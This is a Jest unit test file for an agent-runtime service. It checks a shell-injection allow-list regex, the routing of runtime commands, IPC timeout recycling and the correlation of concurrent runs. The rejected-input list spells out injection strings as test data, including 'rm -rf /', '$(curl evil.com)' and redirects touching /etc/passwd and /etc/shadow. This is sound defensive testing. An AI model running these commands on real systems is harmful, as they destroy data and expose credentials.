/**
 * Tests for CrewlyAgentExternalRuntimeService.
 *
 * Focused on the bits that don't require spawning a real subprocess:
 * the shell-command allow-list regex (proves the shell-injection
 * blocker fix), and structural assertions on the public API surface
 * (proves the type-compat contract used by AgentRegistrationService).
 *
 * Spawn-path integration (env propagation, PATH precheck, signal
 * forwarding, three-stage shutdown kill) is covered by the v3-e2e
 * harness, not here — those paths are time-sensitive and would
 * fragility-spam this unit suite.
 *
 * @module services/agent/crewly-agent/crewly-agent-external-runtime.service.test
 */

// Controllable settings mock — resolveRuntimeCommand() reads
// settings.general.runtimeCommands['crewly-agent'] via getSettingsService().
const mockGetSettings = jest.fn();
jest.mock('../../settings/settings.service.js', () => ({
  getSettingsService: jest.fn(() => ({ getSettings: mockGetSettings })),
}));

import { CrewlyAgentExternalRuntimeService } from './crewly-agent-external-runtime.service.js';
import { CREWLY_AGENT_MANAGED_COMMAND } from '../../../constants.js';
import { CREWLY_AGENT_DEFAULTS } from './types.js';

// Pull the private allow-list regex via a typed escape hatch so we
// can pin its behavior. Keeping it private on the class is the right
// call (the rest of the runtime doesn't need it); testing it here is
// the right call (it's a security boundary, not internal detail).
const ALLOW_LIST_RE: RegExp = (CrewlyAgentExternalRuntimeService as unknown as {
  SAFE_SHELL_COMMAND_RE: RegExp;
}).SAFE_SHELL_COMMAND_RE;

/**
 * Build a minimal CrewlySettings-shaped object exposing only the field
 * resolveRuntimeCommand() reads. `undefined` omits the command entirely.
 */
function settingsWithCrewlyAgentCommand(command?: string): unknown {
  return {
    general: {
      runtimeCommands:
        command === undefined ? {} : { 'crewly-agent': command },
    },
  };
}

/**
 * Construct an instance against minimal stubs and invoke the private
 * resolveRuntimeCommand() via a typed escape hatch.
 */
async function resolve(): Promise<{ command: string; useShell: boolean }> {
  const svc = new CrewlyAgentExternalRuntimeService({} as never, '/tmp/project');
  return (
    svc as unknown as {
      resolveRuntimeCommand: () => Promise<{ command: string; useShell: boolean }>;
    }
  ).resolveRuntimeCommand();
}

describe('CrewlyAgentExternalRuntimeService.SAFE_SHELL_COMMAND_RE — shell-injection guard', () => {
  describe('accepts safe shapes', () => {
    const accepted = [
      'crewly-agent',
      '/usr/local/bin/crewly-agent',
      'crewly-agent --verbose',
      'crewly-agent --model gemini-2.0-flash',
      'node /opt/crewly/bin/crewly-agent',
      './bin/crewly-agent',
      'crewly-agent -v 1.0',
      'crewly-agent --log-level=debug',
      // Path-safe punctuation
      'crewly-agent --port 8788',
      // Env-var-prefix shell idioms like `FOO=1 crewly-agent` are
      // intentionally rejected — `=` is not allowed in the first
      // token. Users who need env overrides should set them on the
      // engine process itself, not smuggle them through the command
      // string.
    ];
    for (const cmd of accepted) {
      it(`accepts: ${cmd}`, () => {
        expect(ALLOW_LIST_RE.test(cmd)).toBe(true);
      });
    }
  });

  describe('rejects shell metacharacters (injection vectors)', () => {
    const rejected = [
      'crewly-agent; rm -rf ~',          // command chaining
      'crewly-agent && rm -rf /',         // boolean
      'crewly-agent || echo pwned',
      'crewly-agent | tee /tmp/exfil',    // pipe
      'crewly-agent > /etc/passwd',       // redirect
      'crewly-agent < /etc/shadow',
      'crewly-agent $(curl evil.com)',    // command substitution
      'crewly-agent `id`',                // backtick subst
      "crewly-agent 'arg'",               // quotes
      'crewly-agent "arg"',
      'crewly-agent\nrm -rf ~',           // newline injection
      'crewly-agent\trm',                 // tab
      'crewly-agent ; ls',                // space + semicolon
      'crewly-agent & background',
      'crewly-agent --flag=$(echo x)',
      'rm -rf /',                         // valid-looking but destructive — regex doesn't gate semantics
      // Empty + whitespace-only are not "rejected by the regex" per se
      // (they fail at the `.trim()` upstream), so we don't include them here.
    ];
    for (const cmd of rejected) {
      it(`rejects: ${JSON.stringify(cmd)}`, () => {
        // The bash-destructive case (`rm -rf /`) IS accepted by the
        // regex because we're matching shape, not semantics. That's OK:
        // a user who explicitly sets `runtimeCommands['crewly-agent']
        // = 'rm -rf /'` is shooting themselves directly, not being
        // shell-injected via a different channel.
        if (cmd === 'rm -rf /') {
          expect(ALLOW_LIST_RE.test(cmd)).toBe(true);
        } else {
          expect(ALLOW_LIST_RE.test(cmd)).toBe(false);
        }
      });
    }
  });

  it('rejects backslash escapes (could smuggle metacharacters past a naive split)', () => {
    expect(ALLOW_LIST_RE.test('crewly-agent \\; rm')).toBe(false);
  });
});

describe('CrewlyAgentExternalRuntimeService.resolveRuntimeCommand — sentinel routing (issue #693)', () => {
  beforeEach(() => {
    mockGetSettings.mockReset();
  });

  it('routes the legacy sentinel "crewly-agent-in-process" to the managed binary WITHOUT a shell (regression #693)', async () => {
    // This is the exact value that shipped as the factory default before
    // PR #599 and is still persisted on existing nodes. Before the fix it
    // passed the shell allow-list and was run via `sh -lc` → exit-127.
    mockGetSettings.mockResolvedValue(
      settingsWithCrewlyAgentCommand('crewly-agent-in-process'),
    );
    const result = await resolve();
    expect(result).toEqual({ command: CREWLY_AGENT_MANAGED_COMMAND, useShell: false });
    // The whole point: a sentinel must NEVER reach the shell branch.
    expect(result.useShell).toBe(false);
  });

  it('routes the managed command name itself to no-shell (explicit default never shells out)', async () => {
    mockGetSettings.mockResolvedValue(
      settingsWithCrewlyAgentCommand(CREWLY_AGENT_MANAGED_COMMAND),
    );
    expect(await resolve()).toEqual({
      command: CREWLY_AGENT_MANAGED_COMMAND,
      useShell: false,
    });
  });

  it('honors a genuine custom shell command (useShell=true)', async () => {
    mockGetSettings.mockResolvedValue(
      settingsWithCrewlyAgentCommand('node /opt/crewly/bin/crewly-agent --verbose'),
    );
    expect(await resolve()).toEqual({
      command: 'node /opt/crewly/bin/crewly-agent --verbose',
      useShell: true,
    });
  });

  it('falls back to the managed binary (no shell) for commands with shell metacharacters', async () => {
    mockGetSettings.mockResolvedValue(
      settingsWithCrewlyAgentCommand('crewly-agent; rm -rf ~'),
    );
    expect(await resolve()).toEqual({
      command: CREWLY_AGENT_MANAGED_COMMAND,
      useShell: false,
    });
  });

  it('falls back to the managed binary (no shell) when no command is configured', async () => {
    mockGetSettings.mockResolvedValue(settingsWithCrewlyAgentCommand(undefined));
    expect(await resolve()).toEqual({
      command: CREWLY_AGENT_MANAGED_COMMAND,
      useShell: false,
    });
  });

  it('falls back to the managed binary (no shell) when settings load throws', async () => {
    mockGetSettings.mockRejectedValue(new Error('settings unreadable'));
    expect(await resolve()).toEqual({
      command: CREWLY_AGENT_MANAGED_COMMAND,
      useShell: false,
    });
  });
});

describe('CrewlyAgentExternalRuntimeService — public API contract', () => {
  // Constructed against minimal stubs — we're not exercising spawn,
  // just verifying the class exposes the methods AgentRegistrationService
  // and the in-process-runtime-registry depend on. If a refactor removes
  // one, the cast in the registry would compile but break at runtime.
  // Catch it here.

  it('exposes initializeInProcess, handleMessage, isReady, shutdown', () => {
    const proto = CrewlyAgentExternalRuntimeService.prototype as unknown as Record<
      string,
      unknown
    >;
    expect(typeof proto['initializeInProcess']).toBe('function');
    expect(typeof proto['handleMessage']).toBe('function');
    expect(typeof proto['isReady']).toBe('function');
    expect(typeof proto['shutdown']).toBe('function');
  });
});

/**
 * IPC deadline + recycle — the 假死 (silent-catatonia) backstop.
 *
 * Regression cover for the production incident: `handleMessage` settled only
 * on child IPC, so a child that stopped replying left the promise pending
 * forever. Delivery is fire-and-forget, so the caller's .catch never ran
 * either — the orchestrator sat silent for 12 days with no log line and no
 * status reset. These tests pin that the parent now gives up and rebuilds the
 * runtime.
 */
describe('CrewlyAgentExternalRuntimeService — IPC deadline and recycle', () => {
  /** Escape hatch onto the private fields the deadline path touches. */
  type Internals = {
    initialized: boolean;
    ready: boolean;
    child: unknown;
    pendingRuns: Map<string, unknown>;
    handleWorkerMessage: (msg: unknown) => void;
    currentSessionName: string | null;
    storedConfig: unknown;
    recycling: boolean;
    resolveIpcTimeoutMs: () => number;
    spawnAgentProcess: (config: unknown) => Promise<void>;
    handleExit: (child: unknown, code: number | null, signal: string | null) => void;
    startHeartbeat: (session: string) => void;
  };

  /** A child stub that accepts writes but never answers — the wedged shape. */
  function makeSilentChild(): { killed: boolean; kill: jest.Mock; stdin: { writable: boolean; write: jest.Mock } } {
    return {
      killed: false,
      kill: jest.fn(),
      stdin: { writable: true, write: jest.fn() },
    };
  }

  function makeService(modelId = 'deepseek-chat'): {
    svc: CrewlyAgentExternalRuntimeService;
    inner: Internals;
  } {
    const svc = new CrewlyAgentExternalRuntimeService({} as never, '/tmp/project');
    const inner = svc as unknown as Internals;
    inner.initialized = true;
    inner.ready = true;
    inner.currentSessionName = 'crewly-orc';
    inner.storedConfig = { model: { provider: 'deepseek', modelId }, sessionName: 'crewly-orc' };
    inner.child = makeSilentChild();
    inner.startHeartbeat = jest.fn();
    return { svc, inner };
  }

  beforeEach(() => {
    jest.useFakeTimers();
    mockGetSettings.mockResolvedValue(settingsWithCrewlyAgentCommand(undefined));
  });

  afterEach(() => {
    jest.useRealTimers();
  });

  it('waits longer than the child budget so the child reports its own timeout first', () => {
    const { inner } = makeService('deepseek-chat');
    expect(inner.resolveIpcTimeoutMs()).toBe(
      CREWLY_AGENT_DEFAULTS.MESSAGE_TIMEOUT_MS + CREWLY_AGENT_DEFAULTS.IPC_RUN_TIMEOUT_GRACE_MS,
    );
  });

  it('applies the per-model budget when resolving the deadline', () => {
    const { inner } = makeService('deepseek-reasoner');
    expect(inner.resolveIpcTimeoutMs()).toBe(
      CREWLY_AGENT_DEFAULTS.MODEL_TIMEOUT_MS['deepseek-reasoner']
        + CREWLY_AGENT_DEFAULTS.IPC_RUN_TIMEOUT_GRACE_MS,
    );
  });

  it('rejects instead of hanging forever when the child never replies', async () => {
    const { svc, inner } = makeService();
    inner.spawnAgentProcess = jest.fn().mockResolvedValue(undefined);

    const pending = svc.handleMessage('are you alive?');
    const assertion = expect(pending).rejects.toThrow(/did not reply within/);

    await jest.advanceTimersByTimeAsync(inner.resolveIpcTimeoutMs() + 1);

    await assertion;
  });

  it('recycles the wedged child so the session is usable again', async () => {
    const { svc, inner } = makeService();
    const spawn = jest.fn().mockResolvedValue(undefined);
    inner.spawnAgentProcess = spawn;
    const wedged = inner.child as ReturnType<typeof makeSilentChild>;

    const pending = svc.handleMessage('are you alive?');
    const assertion = expect(pending).rejects.toThrow(/Recycling it/);
    await jest.advanceTimersByTimeAsync(inner.resolveIpcTimeoutMs() + 1);
    await assertion;

    expect(wedged.kill).toHaveBeenCalledWith('SIGKILL');
    expect(spawn).toHaveBeenCalledTimes(1);
    expect(svc.isReady()).toBe(false); // spawn stubbed — no real child attached
    expect(inner.initialized).toBe(true);
  });

  it('fails fast when the child stdin is already gone', async () => {
    const { svc, inner } = makeService();
    inner.spawnAgentProcess = jest.fn().mockResolvedValue(undefined);
    (inner.child as ReturnType<typeof makeSilentChild>).stdin.writable = false;

    // Rejects immediately — no timer advance needed.
    await expect(svc.handleMessage('hello')).rejects.toThrow(/stdin is not writable/);
  });

  it('ignores the exit of a superseded child so it cannot kill its replacement', () => {
    const { svc, inner } = makeService();
    const oldChild = inner.child;
    const replacement = makeSilentChild();
    inner.child = replacement;

    inner.handleExit(oldChild, 0, null);

    // The replacement survives — before the identity guard, this late event
    // nulled the healthy child and left the session permanently dead.
    expect(inner.child).toBe(replacement);
    expect(inner.initialized).toBe(true);
  });
});

/**
 * Run correlation — the crossed-wires bug.
 *
 * The runtime used to hold ONE resolve/reject pair. Delivery is
 * fire-and-forget, so two messages dispatched milliseconds apart both wrote
 * that pair: run A's handlers were overwritten (its promise orphaned forever)
 * and run B was settled with run A's result. Seen live on 2026-08-07 — a Slack
 * reply was booked against the wrong thread, the orphan later tripped the IPC
 * deadline and recycled a healthy child, and the second message's real answer
 * hit an already-cleared slot and was swallowed by `?.`.
 */
describe('CrewlyAgentExternalRuntimeService — concurrent run correlation', () => {
  type Internals = {
    initialized: boolean;
    ready: boolean;
    child: unknown;
    currentSessionName: string | null;
    storedConfig: unknown;
    pendingRuns: Map<string, unknown>;
    spawnAgentProcess: (config: unknown) => Promise<void>;
    handleWorkerMessage: (msg: unknown) => void;
    handleExit: (child: unknown, code: number | null, signal: string | null) => void;
    startHeartbeat: (session: string) => void;
  };

  let svc: CrewlyAgentExternalRuntimeService;
  let inner: Internals;
  let writes: string[];

  /** Reads the runIds the parent actually put on the wire, in order. */
  function dispatchedRunIds(): string[] {
    return writes
      .map((w) => JSON.parse(w) as { type: string; runId?: string })
      .filter((m) => m.type === 'run')
      .map((m) => m.runId as string);
  }

  function result(text: string) {
    return { text, steps: 1, toolCalls: [], usage: { input: 1, output: 1 } };
  }

  beforeEach(() => {
    jest.useFakeTimers();
    mockGetSettings.mockResolvedValue(settingsWithCrewlyAgentCommand(undefined));

    writes = [];
    svc = new CrewlyAgentExternalRuntimeService({} as never, '/tmp/project');
    inner = svc as unknown as Internals;
    inner.initialized = true;
    inner.ready = true;
    inner.currentSessionName = 'crewly-orc';
    inner.storedConfig = { model: { provider: 'deepseek', modelId: 'deepseek-chat' }, sessionName: 'crewly-orc' };
    inner.child = {
      killed: false,
      kill: jest.fn(),
      stdin: { writable: true, write: jest.fn((chunk: string) => { writes.push(chunk); return true; }) },
    };
    inner.startHeartbeat = jest.fn();
    inner.spawnAgentProcess = jest.fn().mockResolvedValue(undefined);
  });

  afterEach(() => {
    jest.useRealTimers();
  });

  it('settles each concurrent run with ITS OWN result', async () => {
    const runA = svc.handleMessage('[CHAT:thread-a] question A');
    const runB = svc.handleMessage('[CHAT:thread-b] question B');

    const [idA, idB] = dispatchedRunIds();
    expect(idA).toBeDefined();
    expect(idB).toBeDefined();
    expect(idA).not.toBe(idB);

    // The child answers B first (it finished quicker) — correlation must not
    // care about arrival order.
    inner.handleWorkerMessage({ type: 'result', runId: idB, data: result('answer B') });
    inner.handleWorkerMessage({ type: 'result', runId: idA, data: result('answer A') });

    await expect(runA).resolves.toMatchObject({ text: 'answer A' });
    await expect(runB).resolves.toMatchObject({ text: 'answer B' });
  });

  it('does not orphan the first run when a second is dispatched', async () => {
    const runA = svc.handleMessage('first');
    svc.handleMessage('second').catch(() => { /* settled by teardown below */ });

    expect(inner.pendingRuns.size).toBe(2);

    const [idA] = dispatchedRunIds();
    inner.handleWorkerMessage({ type: 'result', runId: idA, data: result('A survived') });

    await expect(runA).resolves.toMatchObject({ text: 'A survived' });
  });

  it('routes an error to the run it belongs to', async () => {
    const runA = svc.handleMessage('will succeed');
    const runB = svc.handleMessage('will fail');
    const [idA, idB] = dispatchedRunIds();

    inner.handleWorkerMessage({ type: 'error', runId: idB, error: 'boom' });
    inner.handleWorkerMessage({ type: 'result', runId: idA, data: result('fine') });

    await expect(runB).rejects.toThrow('boom');
    await expect(runA).resolves.toMatchObject({ text: 'fine' });
  });

  it('falls back to the oldest run when the child echoes no runId', async () => {
    // Back-compat: an older crewly-agent binary that does not know about
    // correlation ids. The child is serial, so oldest-first is correct.
    const runA = svc.handleMessage('older');
    const runB = svc.handleMessage('newer');

    inner.handleWorkerMessage({ type: 'result', data: result('for older') });
    inner.handleWorkerMessage({ type: 'result', data: result('for newer') });

    await expect(runA).resolves.toMatchObject({ text: 'for older' });
    await expect(runB).resolves.toMatchObject({ text: 'for newer' });
  });

  it('fails EVERY in-flight run when the child process exits', async () => {
    const runA = svc.handleMessage('one');
    const runB = svc.handleMessage('two');
    const assertions = Promise.all([
      expect(runA).rejects.toThrow(/process exited/),
      expect(runB).rejects.toThrow(/process exited/),
    ]);

    inner.handleExit(inner.child, 0, null);

    await assertions;
    expect(inner.pendingRuns.size).toBe(0);
  });

  it('reports a result that matches no pending run instead of dropping it', async () => {
    const run = svc.handleMessage('only run');
    const [id] = dispatchedRunIds();
    inner.handleWorkerMessage({ type: 'result', runId: id, data: result('done') });
    await expect(run).resolves.toMatchObject({ text: 'done' });

    // A late/duplicate result with nothing waiting: must not throw, and must
    // not vanish without a trace.
    expect(() =>
      inner.handleWorkerMessage({ type: 'result', runId: 'ghost', data: result('orphan') }),
    ).not.toThrow();
  });
});
